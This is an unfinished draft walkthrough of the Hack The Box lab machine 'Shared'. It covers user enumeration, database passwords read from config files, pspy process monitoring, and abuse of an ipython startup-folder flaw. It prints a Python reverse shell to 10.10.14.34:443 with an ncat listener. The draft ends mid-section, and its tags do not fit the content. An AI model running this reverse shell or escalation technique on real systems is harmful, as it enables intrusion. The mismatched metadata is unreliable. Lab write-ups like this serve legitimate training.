---
title: HTB - Shared
description: This is an example doc layout of Eureka theme
toc: true
authors: Alpharivs
tags:
  - malware
  - analysis
  - static
  - dynamic
  - reversing
  - dropper
  - wannacry
categories: writeups
date: '2022-11-08'
draft: true
---
# Under Construction
## User: james_mason

We can now ssh into the box as the user james_mason.
```bash
james_mason@shared:~$ whoami
james_mason
```
### Enumeration

First let's check other users of the machine.
```bash
james_mason@shared:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
james_mason:x:1000:1000:james_mason,,,:/home/james_mason:/bin/bash
dan_smith:x:1001:1002::/home/dan_smith:/bin/bash
```
Interestingly when checking which groups our user has membership of we can see a suspicious non default group.
```bash
james_mason@shared:~$ id
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
```

### Developer Group

```bash
james_mason@shared:~$ find / -group developer -ls 2>/dev/null
    46286      4 drwxrwx---   2 root     developer     4096 Nov 14 12:20 /opt/scripts_review
```

```bash
james_mason@shared:/var/www/shared.htb/ps/app/config$ grep -R -i password
doctrine.yml:        password: "%database_password%"
config.yml:    password:  "%mailer_password%"
parameters.yml.dist:    database_password: ~
parameters.yml.dist:    mailer_password:   ~
parameters.php:    'database_password' => 'T*k#cbND_C*WrQ9h',
parameters.php:    'mailer_password' => NULL,
```
```bash
james_mason@shared:/var/www/shared.htb/ps/app/config$ cat parameters.php
...(SNIP)...
    'database_user' => 'pshop',
    'database_password' => 'T*k#cbND_C*WrQ9h',
```
```bash
james_mason@shared:/var/www/checkout.shared.htb/config$ cat db.php 
<?php
define('DBHOST','localhost');
define('DBUSER','checkout');
define('DBPWD','a54$K_M4?DdT^HUk');
define('DBNAME','checkout');
?>
```

### Processes Enumeration

```bash
james_mason@shared:/dev/shm$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done

...(snip)...

2022/11/14 12:51:01 CMD: UID=1001 PID=11616  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
2022/11/14 12:51:01 CMD: UID=1001 PID=11615  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
2022/11/14 12:51:01 CMD: UID=1001 PID=11617  | /usr/bin/python3 /usr/local/bin/ipython 
```
ipython cod execution [this page](https://security.snyk.io/vuln/SNYK-PYTHON-IPYTHON-2348630) which leads to the patch release notes where we can find a link to a [GitHub advisory](https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x) that details the vulnerability 

```bash
mkdir -m 777 -p /opt/scripts_review/profile_default/startup
```
and we can create a malicious python script inside.
```python
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.34",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```
```bash
sudo ncat -lnvp 443
```
and after some time we successfully receive a shell.

```bash

```

## User: dan
